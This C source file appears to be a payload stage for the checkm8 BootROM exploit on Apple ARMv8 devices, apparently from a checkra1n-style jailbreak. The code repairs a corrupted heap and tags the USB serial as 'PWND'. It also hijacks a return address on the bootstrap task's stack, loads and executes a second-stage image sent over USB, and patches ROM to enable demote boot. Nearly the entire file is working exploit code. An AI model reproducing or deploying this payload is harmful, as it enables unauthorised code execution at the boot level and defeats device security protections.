#include <util/armv8.h>
#include "bootrom_func.h"

GLOBAL_PTR(addr_bootstrap_task, ADDR_BOOTSTRAP_TASK)
GLOBAL_PTR(addr_demote_reg, ADDR_DEMOTE_REG)
GLOBAL_PTR(addr_usb_serial, ADDR_USB_SERIAL)

GLOBAL_STR(pwnd_str, " PWND:[checkm8]");

PAYLOAD_SECTION
void patch_serial()
{
    int len, base;
    char *serial = GET_GLOBAL(addr_usb_serial);
    char *patch = GET_PTR_TO_GLOBAL(pwnd_str);

    base = dev_strlen(serial);
    len = dev_strlen(patch);

    dev_memcpy(serial + base, patch, len);
    *((uint8_t *) ADDR_CORE_DESC_SERIAL) =
            usb_create_descriptor(serial);
}

PAYLOAD_SECTION
void fix_heap()
{
    struct heap_header *broken = (struct heap_header *) 0x1801B9200;
    broken->curr_size = 4;
    broken->curr_free = 0;
    broken->prev_size = 2;
    broken->prev_free = 0;

    calc_chksum(&broken->chksum, &broken->curr_size, 32, (void *) ADDR_HEAP_COOKIE);

    struct heap_header *next = (struct heap_header *) 0x1801B9300;
    next->prev_size = 4;
    calc_chksum(&next->chksum, &next->curr_size, 32, (void *) ADDR_HEAP_COOKIE);
}

// order of this function is important -- should be before run()
PAYLOAD_SECTION
void trampoline_func()
{
    void *target = dev_malloc(0x1000);
    void (*get_img_usb)(uint64_t *, uint32_t) = (void *) ADDR_GET_IMG_USB;
    void (*execute_img)() = (void *) EXECUTABLE_SRAM(target);

    get_img_usb(target, 0x1000);
    __asm__ volatile ("dmb sy");
    __asm__ volatile ("ic iallu");
    __asm__ volatile ("dsb sy");
    __asm__ volatile ("isb");
    __asm__ volatile ("b 0");

    // here, control passes to PAYLOAD_CHECKRA1N_STAGE2
    execute_img();
}

PAYLOAD_SECTION
void run()
{
    // todo: this is half patchfinding and half hardcoded -- it would be good to standardize (once it works)
    uint64_t *bs_task, **bs_sp, *bs_fp;
    uint32_t bs_val, *patch_start, *patch_end, *patch_dst;

    fix_heap();
    check_all_chksums();
    patch_serial();

    __asm__ volatile ("adr %0, trampoline_func" : "=r" (patch_start));
    __asm__ volatile ("adr %0, run" : "=r" (patch_end));
    patch_dst = dev_malloc((void *) patch_end - (void *) patch_start);

    bs_task = GET_GLOBAL(addr_bootstrap_task);
    bs_fp = (uint64_t *) bs_task[35];
    bs_sp = (uint64_t **) bs_task[37];

    while(1)
    {
        // spin if searched entire stack
//        if(bs_sp == bs_fp) while(1);

        // search for the tbnz after getDFUImage
        // first look for the return address on the stack
        if(*bs_sp >= (uint64_t *) 0x100000000 &&
           *bs_sp <= (uint64_t *) 0x100020000)
        {
            // then check if the return address matches tbnz instruction pattern
            bs_val = *((uint32_t *) *bs_sp);
            if((bs_val & 0xFFFF0000) == 0x37f80000)
                break;
        }

        bs_sp++;
    }

    *bs_sp = EXECUTABLE_SRAM(((void *) patch_dst));
    while(patch_start != patch_end)
        *patch_dst++ = *patch_start++;

    // enable demote boot
    *(uint32_t *)(WRITEABLE_ROM(0x100006c54)) = MOVZ(X0, 1, 0);
    __asm__ volatile ("dmb sy");
    __asm__ volatile ("ic iallu");
    __asm__ volatile ("dsb sy");
    __asm__ volatile ("isb");

    // hop out of DFU mode, into our own DFU handler
    *((int *) ADDR_DFU_RETVAL) = -1;
    *((char *) ADDR_DFU_STATUS) = 1;
    event_notify((struct event *) ADDR_DFU_EVENT);
}


void _start()
{
    run();
}